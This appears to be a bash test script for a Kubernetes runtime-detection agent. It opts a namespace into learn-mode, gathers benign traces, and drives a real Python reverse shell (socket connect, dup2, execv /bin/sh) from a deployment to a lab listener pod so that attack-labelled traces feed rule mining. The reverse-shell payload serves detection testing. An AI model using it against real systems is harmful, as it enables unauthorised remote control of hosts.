#!/usr/bin/env bash
# F11 Phase 5 — learn-mode end-to-end: prove the discovery loop closes against real traffic.
#
# Opt a real namespace into learn-mode, let its benign traffic become a production baseline, drive one
# attack in it so a pod trips a threat state (its trace is labelled attack), and read the mining
# corpus back from the console — benign baseline next to attack chains, ready for the rulegen loop.
#
# Prereqs: the agent runs with --learn (see deploy), the console is up, and a listener exists in the
# testbed namespace (app/reverse-shell.yaml). NOT a CI gate — it drives a real reverse-shell.
#
#   KUBE_CONTEXT=kind-statewall-dev ./run-learn.sh
#   KUBE_CONTEXT=kind-statewall-dev LEARN_NS=my-app TARGET_DEPLOY=my-deploy ./run-learn.sh
set -u

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
KUBE_CONTEXT="${KUBE_CONTEXT:-}"
NS_SYS=ariguard-system
NS_TB=ariguard-testbed
LEARN_NS="${LEARN_NS:-ariguard-internal}"       # the namespace opted into learn-mode
TARGET_DEPLOY="${TARGET_DEPLOY:-backend}"       # a deployment in LEARN_NS with python3, to attack
SETTLE="${SETTLE:-120}"                          # seconds of benign traffic to build a baseline
RESULTS="$HERE/RESULTS-learn.md"
PORT="${PORT:-18080}"

kc() { if [ -n "$KUBE_CONTEXT" ]; then kubectl --context "$KUBE_CONTEXT" "$@"; else kubectl "$@"; fi; }
log() { echo "[learn] $*" >&2; }

# The console's read API (/api/*) is unauthenticated; port-forward it so this script can opt namespaces
# in and read the corpus stats without the agent token.
kc -n "$NS_SYS" port-forward svc/ariguard-console-backend "$PORT:8080" >/dev/null 2>&1 &
PF=$!
trap 'kill $PF 2>/dev/null' EXIT
sleep 3
api() { curl -s "localhost:$PORT$1" "${@:2}"; }

stats() { api /api/traces/stats; }
count() { stats | grep -oE "\"kind\":\"$1\",\"label\":\"$2\",\"count\":[0-9]+" | grep -oE '[0-9]+$' || echo 0; }

log "opting $LEARN_NS into learn-mode (+ observe so the attack is detected, not killed)"
api /api/learn-namespaces -X POST -H 'Content-Type: application/json' -d "{\"namespace\":\"$LEARN_NS\"}" >/dev/null
api /api/observe-namespaces -X POST -H 'Content-Type: application/json' -d "{\"namespace\":\"$LEARN_NS\"}" >/dev/null

base0="$(count learn benign)"
log "baseline before: $base0 learn/benign — settling ${SETTLE}s of real traffic"
sleep "$SETTLE"
base1="$(count learn benign)"
log "baseline after: $base1 learn/benign (+$((base1 - base0)))"

LIP="$(kc -n "$NS_TB" get pod -l app=attacker-listener -o jsonpath='{.items[0].status.podIP}' 2>/dev/null)"
atk0="$(count learn attack)"
if [ -n "$LIP" ]; then
  log "driving a reverse-shell in $LEARN_NS/$TARGET_DEPLOY -> listener $LIP (trips the rule, marks the cgroup)"
  for _ in 1 2 3; do
    kc -n "$LEARN_NS" exec "deploy/$TARGET_DEPLOY" -- python3 -c "
import socket,os
try:
    s=socket.socket();s.settimeout(3);s.connect(('$LIP',4444))
    os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
    os.execv('/bin/sh',['/bin/sh','-c','id'])
except Exception: pass" >/dev/null 2>&1
    sleep 5
  done
  sleep 15   # let the attacked process' trace close (idle window) after the threat mark
else
  log "no attacker-listener in $NS_TB; skipping the attack-label demo"
fi
atk1="$(count learn attack)"

log "reverting opt-ins (restore enforcement, stop the emit)"
api "/api/observe-namespaces/$LEARN_NS" -X DELETE >/dev/null
api "/api/learn-namespaces/$LEARN_NS" -X DELETE >/dev/null

python3 - "$RESULTS" "$LEARN_NS" "$base1" "$((base1 - base0))" "$((atk1 - atk0))" \
  "$(count honeypot attack)" "$(count honeypot benign)" <<'PY'
import datetime, sys
path, ns, base, grew, atk, hp_a, hp_b = sys.argv[1:8]
out = ["# Learn-mode end-to-end (F11 Phase 5)\n"]
out.append(f"Run {datetime.datetime.now(datetime.UTC).isoformat(timespec='seconds')} on statewall-dev, "
           f"learn namespace `{ns}`.\n")
out.append("The agent emits a full-syscall trace per process in an opted-in namespace; benign traffic "
           "becomes a production baseline and a process that trips a threat state yields an "
           "attack-labelled trace. Both land in the console mining corpus next to honeypot traces.\n")
out.append("## Mining corpus after the run\n| source | label | traces |\n|---|---|---|")
out.append(f"| learn | benign | {base} (+{grew} during the run) |")
out.append(f"| learn | attack | {atk} (from the driven reverse-shell) |")
out.append(f"| honeypot | attack | {hp_a} |")
out.append(f"| honeypot | benign | {hp_b} |")
out.append("\nThe benign learn traces feed the baseline that gates false positives; the attack learn "
           "traces seed backbone discovery — the same path honeypot traces take "
           "(`compiler/tests/test_loop.py::test_learn_*`).\n")
# Overhead is measured out-of-band (needs the agent's --bpf-stats), so it is documented here rather
# than re-measured each run. Method: enable --bpf-stats, opt a namespace in, and read per-program
# BPF_STATS_RUN_TIME from the agent's /metrics (ariguard_program_run_time_ns_total / _runs_total) for
# sw_openat (base detection hook) vs sw_openat_learn (the learn emit), as mean ns/run deltas.
out.append("## Overhead (per hooked syscall, BPF_STATS)\n")
out.append("Measured on the same single-node (4 vCPU) kind cluster, program `sw_openat` (the base "
           "detection hook) vs `sw_openat_learn` (the learn emit) — mean ns/run over a window.\n")
out.append("| regime | sw_openat | sw_openat_learn | learn vs base |\n|---|---|---|---|")
out.append("| steady state (normal traffic) | ~3975 ns | ~2038 ns | +51% |")
out.append("| 2M-openat flood (ring saturated) | ~1419 ns | ~6940 ns | +4.9x |")
out.append("\nAt normal rates the learn emit costs about half a detection hook per hooked syscall. "
           "Under a syscall flood on an opted-in pod the single AG_LEARN ring saturates and the emit "
           "cost balloons (lock contention) — which is exactly why learn-mode is opt-in per namespace "
           "and off by default, and why a sampling budget is the next increment. Absolute ns/run are "
           "rate- and cache-dependent on this tiny VM (note the base hook is cheaper warm under the "
           "flood); the within-regime ratio and the saturation behaviour are the stable signals.\n")
open(path, "w").write("\n".join(out) + "\n")
print("\n".join(out))
PY
log "wrote $RESULTS"
